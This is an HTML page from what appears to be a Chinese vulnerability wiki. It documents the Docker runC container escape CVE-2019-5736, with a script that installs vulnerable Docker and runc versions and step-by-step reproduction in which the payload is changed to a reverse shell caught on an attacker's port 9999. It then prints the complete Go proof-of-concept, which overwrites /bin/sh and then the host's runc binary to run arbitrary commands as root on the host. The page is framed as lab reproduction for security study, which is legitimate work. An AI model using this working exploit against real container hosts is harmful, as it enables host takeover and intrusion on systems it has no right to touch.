<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Docker%20runC%20%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2019-5736/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Docker runC 漏洞导致容器逃逸 CVE-2019-5736 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Docker runC \u6f0f\u6d1e\u5bfc\u81f4\u5bb9\u5668\u9003\u9038 CVE-2019-5736", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_3" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
              {title: "\u6f0f\u6d1e POC", url: "#poc" },
              {title: "\u6f0f\u6d1e\u4fee\u590d", url: "#_5" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="btn btn-xs btn-link">
        Kubernetes + Ubuntu 18.04 漏洞环境搭建
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Docker%20daemon%20api%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20RCE/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Docker%20daemon%20api%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20RCE/" class="btn btn-xs btn-link">
        Docker daemon api 未授权访问漏洞 RCE
      </a>
    </div>
    
  </div>

    

    <h1 id="docker-runc-cve-2019-5736">Docker runC 漏洞导致容器逃逸 CVE-2019-5736<a class="headerlink" href="#docker-runc-cve-2019-5736" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Docker、containerd 或者其他基于 runc 的容器在运行时存在安全漏洞，攻击者可以通过特定的容器镜像或者 exec 操作获取到宿主机 runc 执行时的文件句柄并修改 runc 的二进制文件，从而获取到宿主机的 root 执行权限。要利用此漏洞，需要在容器内拥有 root (uid 0)。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5736">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5736</a></li>
<li><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>
</ul>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>docker version &lt;= 18.09.2 
RunC version &lt;= 1.0-rc6
</code></pre></div>
<h2 id="_3">环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>ubuntu 18.04 使用以下脚本 <code>install_docker_18.09.0.sh</code> 安装 Docker 18.09.0：</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
<span class="nb">set</span><span class="w"> </span>-e
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Removing old Docker versions (if any)...&quot;</span>
sudo<span class="w"> </span>apt<span class="w"> </span>remove<span class="w"> </span>-y<span class="w"> </span>docker<span class="w"> </span>docker-engine<span class="w"> </span>docker.io<span class="w"> </span>containerd<span class="w"> </span>runc<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">true</span>

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Unholding previously held Docker packages (if any)...&quot;</span>
sudo<span class="w"> </span>apt-mark<span class="w"> </span>unhold<span class="w"> </span>docker-ce<span class="w"> </span>docker-ce-cli<span class="w"> </span>containerd.io<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">true</span>

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Removing incorrect Docker sources...&quot;</span>
sudo<span class="w"> </span>rm<span class="w"> </span>-f<span class="w"> </span>/etc/apt/sources.list.d/docker.list<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">true</span>
sudo<span class="w"> </span>sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;/download.docker.com/d&#39;</span><span class="w"> </span>/etc/apt/sources.list

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Adding Tsinghua University Docker mirror GPG key...&quot;</span>
wget<span class="w"> </span>-qO<span class="w"> </span>-<span class="w"> </span>https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu/gpg<span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>apt-key<span class="w"> </span>add<span class="w"> </span>-

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Adding Tsinghua University Docker mirror repository...&quot;</span>
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu bionic stable&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>/etc/apt/sources.list.d/docker.list

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Updating package index...&quot;</span>
sudo<span class="w"> </span>apt<span class="w"> </span>update

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Searching for Docker 18.09.0...&quot;</span>
<span class="nv">VERSION_STRING</span><span class="o">=</span><span class="k">$(</span>apt-cache<span class="w"> </span>madison<span class="w"> </span>docker-ce<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="m">18</span>.09.0<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-n1<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $3}&#39;</span><span class="k">)</span>
<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-z<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$VERSION_STRING</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Docker 18.09.0 not found&quot;</span>
<span class="w">  </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
<span class="k">fi</span>
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Found version: </span><span class="nv">$VERSION_STRING</span><span class="s2">&quot;</span>

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Installing Docker version </span><span class="nv">$VERSION_STRING</span><span class="s2"> ...&quot;</span>
sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>docker-ce<span class="o">=</span><span class="nv">$VERSION_STRING</span><span class="w"> </span>docker-ce-cli<span class="o">=</span><span class="nv">$VERSION_STRING</span><span class="w"> </span>containerd.io<span class="w"> </span>--allow-downgrades

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Locking version to prevent automatic updates...&quot;</span>
sudo<span class="w"> </span>apt-mark<span class="w"> </span>hold<span class="w"> </span>docker-ce<span class="w"> </span>docker-ce-cli<span class="w"> </span>containerd.io

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;[*] Installation complete, current version:&quot;</span>
docker<span class="w"> </span>--version
</code></pre></div>
<p>安装 runc：</p>
<div class="highlight"><pre><span></span><code>wget https://github.com/opencontainers/runc/releases/download/v1.0.0-rc6/runc.amd64
sudo install -m 755 runc.amd64 /usr/local/sbin/runc
</code></pre></div>
<p><img alt="" src="../images/Docker%20runC%20%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2019-5736/image-20250609135136844.png" /></p>
<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<p><strong>注意，以下操作将覆盖 runc ，这会导致您的系统无法再运行 Docker 容器。请在虚拟环境中操作。</strong></p>
<p>通过 <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">该项目</a> ，我们将用 <code>#!/proc/self/exe</code> 覆盖容器中的 <code>/bin/sh</code> ，写入恶意命令。如果容器使用 <code>runc</code> 启动，<code>/proc/self/exe</code> 实际指向的就是容器运行时使用的 <code>runc</code> 二进制文件。那么，当在容器内执行 <code>/bin/sh</code> 时，将尝试修改 <code>/proc/self/exe</code> 的目标文件，即主机上的 <code>runc</code> 二进制文件。</p>
<p>将 payload 修改为执行反弹 shell，编译：</p>
<div class="highlight"><pre><span></span><code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
</code></pre></div>
<p><img alt="" src="../images/Docker%20runC%20%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2019-5736/image-20250609152613014.png" /></p>
<p>新建一个容器，将编译好的 main 传入容器：</p>
<div class="highlight"><pre><span></span><code>sudo docker run -itd --name=5736 ubuntu bash
docker cp ./main 5736:/
</code></pre></div>
<p>执行 main，覆盖 <code>/bin/sh</code>：</p>
<div class="highlight"><pre><span></span><code>docker exec -it 5736 /bin/bash
root@a9b857df4cc6:/# ./main
[+] Overwritten /bin/sh successfully
</code></pre></div>
<p><img alt="" src="../images/Docker%20runC%20%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2019-5736/image-20250609154151387.png" /></p>
<p>重新打开一个窗口，执行 <code>/bin/sh</code>，获取文件句柄，写入恶意命令：</p>
<div class="highlight"><pre><span></span><code>docker exec -it 5736 /bin/sh
No help topic for &#39;/bin/sh&#39;
</code></pre></div>
<p><img alt="" src="../images/Docker%20runC%20%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2019-5736/image-20250609154322562.png" /></p>
<p>查看之前的窗口，此时已经执行成功：</p>
<p><img alt="" src="../images/Docker%20runC%20%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2019-5736/image-20250609154420443.png" /></p>
<p>退出当前容器，重新进入，触发恶意命令：</p>
<div class="highlight"><pre><span></span><code>docker exec -it 5736 /bin/bash
</code></pre></div>
<p><img alt="" src="../images/Docker%20runC%20%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2019-5736/image-20250609154631151.png" /></p>
<p>攻击机监听 9999 端口：</p>
<p><img alt="" src="../images/Docker%20runC%20%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%20CVE-2019-5736/image-20250609154731981.png" /></p>
<h2 id="poc">漏洞 POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>
</ul>
<div class="highlight"><pre><span></span><code><span class="kn">package</span><span class="w"> </span><span class="nx">main</span>

<span class="c1">// Implementation of CVE-2019-5736</span>
<span class="c1">// Created with help from @singe, @_cablethief, and @feexd.</span>
<span class="c1">// This commit also helped a ton to understand the vuln</span>
<span class="c1">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span>
<span class="kn">import</span><span class="w"> </span><span class="p">(</span>
<span class="w">    </span><span class="s">&quot;fmt&quot;</span>
<span class="w">    </span><span class="s">&quot;io/ioutil&quot;</span>
<span class="w">    </span><span class="s">&quot;os&quot;</span>
<span class="w">    </span><span class="s">&quot;strconv&quot;</span>
<span class="w">    </span><span class="s">&quot;strings&quot;</span>
<span class="w">    </span><span class="s">&quot;flag&quot;</span>
<span class="p">)</span>


<span class="kd">var</span><span class="w"> </span><span class="nx">shellCmd</span><span class="w"> </span><span class="kt">string</span>

<span class="kd">func</span><span class="w"> </span><span class="nx">init</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">flag</span><span class="p">.</span><span class="nx">StringVar</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">shellCmd</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;shell&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Execute arbitrary commands&quot;</span><span class="p">)</span>
<span class="w">    </span><span class="nx">flag</span><span class="p">.</span><span class="nx">Parse</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span><span class="w"> </span><span class="nx">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// This is the line of shell commands that will execute on the host</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">payload</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;#!/bin/bash \n&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">shellCmd</span>
<span class="w">    </span><span class="c1">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span>
<span class="w">    </span><span class="nx">fd</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">os</span><span class="p">.</span><span class="nx">Create</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
<span class="w">        </span><span class="k">return</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Fprintln</span><span class="p">(</span><span class="nx">fd</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;#!/proc/self/exe&quot;</span><span class="p">)</span>
<span class="w">    </span><span class="nx">err</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">fd</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
<span class="w">        </span><span class="k">return</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;[+] Overwritten /bin/sh successfully&quot;</span><span class="p">)</span>

<span class="w">    </span><span class="c1">// Loop through all processes to find one whose cmdline includes runcinit</span>
<span class="w">    </span><span class="c1">// This will be the process created by runc</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">found</span><span class="w"> </span><span class="kt">int</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="nx">found</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">pids</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">ioutil</span><span class="p">.</span><span class="nx">ReadDir</span><span class="p">(</span><span class="s">&quot;/proc&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
<span class="w">            </span><span class="k">return</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="nx">_</span><span class="p">,</span><span class="w"> </span><span class="nx">f</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="k">range</span><span class="w"> </span><span class="nx">pids</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">fbytes</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">ioutil</span><span class="p">.</span><span class="nx">ReadFile</span><span class="p">(</span><span class="s">&quot;/proc/&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">f</span><span class="p">.</span><span class="nx">Name</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;/cmdline&quot;</span><span class="p">)</span>
<span class="w">            </span><span class="nx">fstring</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nb">string</span><span class="p">(</span><span class="nx">fbytes</span><span class="p">)</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nx">Contains</span><span class="p">(</span><span class="nx">fstring</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;runc&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;[+] Found the PID:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">f</span><span class="p">.</span><span class="nx">Name</span><span class="p">())</span>
<span class="w">                </span><span class="nx">found</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">strconv</span><span class="p">.</span><span class="nx">Atoi</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nx">Name</span><span class="p">())</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
<span class="w">                    </span><span class="k">return</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// We will use the pid to get a file handle for runc on the host.</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">handleFd</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="nx">handleFd</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// Note, you do not need to use the O_PATH flag for the exploit to work.</span>
<span class="w">        </span><span class="nx">handle</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">os</span><span class="p">.</span><span class="nx">OpenFile</span><span class="p">(</span><span class="s">&quot;/proc/&quot;</span><span class="o">+</span><span class="nx">strconv</span><span class="p">.</span><span class="nx">Itoa</span><span class="p">(</span><span class="nx">found</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;/exe&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">os</span><span class="p">.</span><span class="nx">O_RDONLY</span><span class="p">,</span><span class="w"> </span><span class="mo">0777</span><span class="p">)</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nb">int</span><span class="p">(</span><span class="nx">handle</span><span class="p">.</span><span class="nx">Fd</span><span class="p">())</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">handleFd</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">int</span><span class="p">(</span><span class="nx">handle</span><span class="p">.</span><span class="nx">Fd</span><span class="p">())</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;[+] Successfully got the file handle&quot;</span><span class="p">)</span>

<span class="w">    </span><span class="c1">// Now that we have the file handle, lets write to the runc binary and overwrite it</span>
<span class="w">    </span><span class="c1">// It will maintain it&#39;s executable flag</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">writeHandle</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">os</span><span class="p">.</span><span class="nx">OpenFile</span><span class="p">(</span><span class="s">&quot;/proc/self/fd/&quot;</span><span class="o">+</span><span class="nx">strconv</span><span class="p">.</span><span class="nx">Itoa</span><span class="p">(</span><span class="nx">handleFd</span><span class="p">),</span><span class="w"> </span><span class="nx">os</span><span class="p">.</span><span class="nx">O_WRONLY</span><span class="o">|</span><span class="nx">os</span><span class="p">.</span><span class="nx">O_TRUNC</span><span class="p">,</span><span class="w"> </span><span class="mo">0700</span><span class="p">)</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nb">int</span><span class="p">(</span><span class="nx">writeHandle</span><span class="p">.</span><span class="nx">Fd</span><span class="p">())</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;[+] Successfully got write handle&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">writeHandle</span><span class="p">)</span>
<span class="w">            </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;[+] The command executed is&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">payload</span><span class="p">)</span>
<span class="w">            </span><span class="nx">writeHandle</span><span class="p">.</span><span class="nx">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">payload</span><span class="p">))</span>
<span class="w">            </span><span class="k">return</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<h2 id="_5">漏洞修复<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
<ul>
<li>升级至最新版本 <a href="https://docs.docker.com/engine/release-notes/">https://docs.docker.com/engine/release-notes/</a></li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="btn btn-xs btn-link">
        Kubernetes + Ubuntu 18.04 漏洞环境搭建
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Docker%20daemon%20api%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20RCE/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Docker%20daemon%20api%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20RCE/" class="btn btn-xs btn-link">
        Docker daemon api 未授权访问漏洞 RCE
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>